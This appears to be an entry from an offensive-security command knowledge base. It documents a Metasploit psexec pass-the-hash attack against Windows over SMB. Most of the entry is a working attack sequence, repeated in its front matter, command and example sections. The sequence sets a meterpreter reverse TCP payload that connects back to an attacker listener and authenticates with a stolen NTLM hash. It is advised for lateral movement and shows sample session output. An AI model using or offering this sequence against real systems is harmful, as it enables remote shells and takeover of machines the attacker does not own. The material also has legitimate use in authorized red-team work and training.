---
type: command
executor: msfconsole
data: |-
  msf6 > use exploit/windows/smb/psexec
  msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/psexec) > set RHOST $_TARGET_IP
  msf6 exploit(windows/smb/psexec) > set LHOST $_ATTACKER_IP
  msf6 exploit(windows/smb/psexec) > set LPORT $_ATTACKER_PORT
  msf6 exploit(windows/smb/psexec) > set SMBUser $_USERNAME
  msf6 exploit(windows/smb/psexec) > set SMBPass $_NTLM_HASH
  msf6 exploit(windows/smb/psexec) > set SMBDomain $_DOMAIN
  msf6 exploit(windows/smb/psexec) > exploit
output: >-
  [*] Started reverse TCP handler on 0.0.0.0:4444 

  [*] 192.168.1.100:445 - Connecting to target...

  [*] 192.168.1.100:445 - Authenticating to 192.168.1.100:445 as user
  'Lambda'...

  [*] 192.168.1.100:445 - Uploading payload...

  [*] 192.168.1.100:445 - Service PSEXESVC started successfully

  [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:random)
  at 2023-10-01 12:00:00 +0000
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - psexec
  - pass-the-hash
verified: true
validated: true
---

# metasploit-psexec-pass-the-hash-meterpreter

## Command

```msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST $_TARGET_IP
msf6 exploit(windows/smb/psexec) > set LHOST $_ATTACKER_IP
msf6 exploit(windows/smb/psexec) > set LPORT $_ATTACKER_PORT
msf6 exploit(windows/smb/psexec) > set SMBUser $_USERNAME
msf6 exploit(windows/smb/psexec) > set SMBPass $_NTLM_HASH
msf6 exploit(windows/smb/psexec) > set SMBDomain $_DOMAIN
msf6 exploit(windows/smb/psexec) > exploit
```

## Description

This command sequence in Metasploit loads the PSExec SMB exploit module, configures it for a Pass the Hash attack using an NTLM hash, sets up a Meterpreter reverse TCP payload, and executes the exploit to gain a shell on the target Windows system. Use this during lateral movement when you have stolen hashes but no plaintext passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the target Windows host | Yes |
| $_ATTACKER_IP | IP address of the attacker's machine (for reverse connection) | Yes |
| $_ATTACKER_PORT | Port on attacker's machine to listen for the reverse shell (e.g., 4444) | Yes |
| $_USERNAME | Username associated with the NTLM hash (administrative privileges required) | Yes |
| $_NTLM_HASH | NTLM hash of the user's password (format: LMHASH:NTHASH or just NTHASH) | Yes |
| $_DOMAIN | Windows domain or workgroup name (e.g., WORKGROUP for local) | Yes |

## Examples

### Basic Usage

Assume target IP 192.168.1.100, attacker 192.168.1.50:4444, user 'Lambda', domain 'WORKGROUP', NTLM hash '598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf'.

```msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.1.100
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/psexec) > set LPORT 4444
msf6 exploit(windows/smb/psexec) > set SMBUser Lambda
msf6 exploit(windows/smb/psexec) > set SMBPass 598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf
msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
msf6 exploit(windows/smb/psexec) > exploit
```

### Advanced Usage

For domain environments, include full domain name in SMBDomain. Add `set TARGET 1` for Unicode support if needed.

```msfconsole
... (same as basic, but SMBDomain set to 'CORP')
msf6 exploit(windows/smb/psexec) > set TARGET 1
msf6 exploit(windows/smb/psexec) > exploit
```

## Expected Output

Successful execution shows the payload handler starting, authentication succeeding via the hash, service upload/execution, and a new Meterpreter session opening. Errors include authentication failures (invalid hash) or connection refusals (firewall/SMB disabled). Sample success:

[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 192.168.1.100:445 - Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:445)

## Related

- [[procedures/Pass-the-Hash-to-Obtain-Meterpreter-Session]]
- [[tools/Metasploit-Framework]]
